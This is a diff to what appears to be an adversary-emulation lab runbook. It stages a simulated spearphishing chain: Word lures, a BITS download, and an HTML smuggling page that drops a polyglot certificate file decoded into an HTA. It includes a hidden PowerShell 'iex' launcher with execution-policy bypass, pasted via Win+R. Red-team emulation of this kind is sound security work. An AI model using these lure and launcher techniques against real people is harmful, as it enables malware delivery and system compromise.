@@ -166,7 +166,7 @@ Confirm the following files are prepared and in place:
 
 **On attacker host — served by `server.py` (TCP 8080, `/media/sf_share`), used by Steps 1B + 1C:**
 - `250325_Pentos_Board_Minutes.zip` — second copy of the same ZIP, downloaded by the Step 1B BITS job (server must advertise `Accept-Ranges` or BITS will not transfer)
-- `staging.html` — HTML smuggling lure page (Step 1C); embeds a base64 blob the browser reassembles into a polyglot `Essos_Compliance_Update.txt` (PEM header + base64 of `stage1.hta`); the `.hta` is then built locally by the Win+R PowerShell launcher — **no `.txt` or `.hta` file is ever hosted**
+- `staging.html` — HTML smuggling lure page (Step 1C); embeds a base64 blob the browser reassembles into a polyglot `Essos_Compliance_Update.cer` (PEM header + base64 of `hpsolutionsportal.hta`); the `.hta` is then built locally by the Win+R PowerShell launcher — **no `.txt` or `.hta` file is ever hosted**
 
 **On WS01** — staged by operator via RDP before running Phase 1:
 - `C:\Users\labuser\Desktop\Braavos_Competitiveness_Brief.docx` — Word lure document for **Steps 1 / 1B** with embedded hyperlink pointing to `http://192.168.56.2/files/250325_Pentos_Board_Minutes.zip` (source template: `resources/payloads/toneshell_spearphishing.docx`)
@@ -175,10 +175,10 @@ Confirm the following files are prepared and in place:
 
 > **BITS variant (Step 1B):** requires the Range-capable `server.py` started above. Build `BitsDownloader.exe` via [`../resources/payloads/file-servers/http-client/csharp-downloader/build.bat`](../resources/payloads/file-servers/http-client/csharp-downloader/build.bat) if missing.
 >
-> **HTML smuggling variant (Step 1C):** uses `Essos_Compliance_Update.docx` whose embedded hyperlink points to `http://192.168.56.2:8080/staging.html` instead of the ZIP. The page smuggles `Essos_Compliance_Update.txt` into `Downloads\` and pre-loads the launcher into the clipboard; the operator then runs it (**Win+R → Ctrl+V → Enter**):
+> **HTML smuggling variant (Step 1C):** uses `Essos_Compliance_Update.docx` whose embedded hyperlink points to `http://192.168.56.2:8080/staging.html` instead of the ZIP. The page smuggles `Essos_Compliance_Update.cer` into `Downloads\` and pre-loads the launcher into the clipboard; the operator then runs it (**Win+R → Ctrl+V → Enter**):
 >
 > ```text
-> powershell -w h -ep bypass -c "iex(gc -Raw '%USERPROFILE%\Downloads\Essos_Compliance_Update.txt')"
+> powershell -w h -ep bypass -c "iex(gc -Raw '%USERPROFILE%\Downloads\Essos_Compliance_Update.cer')"
 > ```
 >
 > PowerShell decodes the polyglot `.txt` into `%TEMP%\Essos_Compliance_Update.hta` and hands it to `mshta.exe`. Rebuild `staging.html` with [`../resources/payloads/user-trigger/html-smuggling-hta/build.py`](../resources/payloads/user-trigger/html-smuggling-hta/build.py) after changing the loader, then re-copy it into `/media/sf_share`.
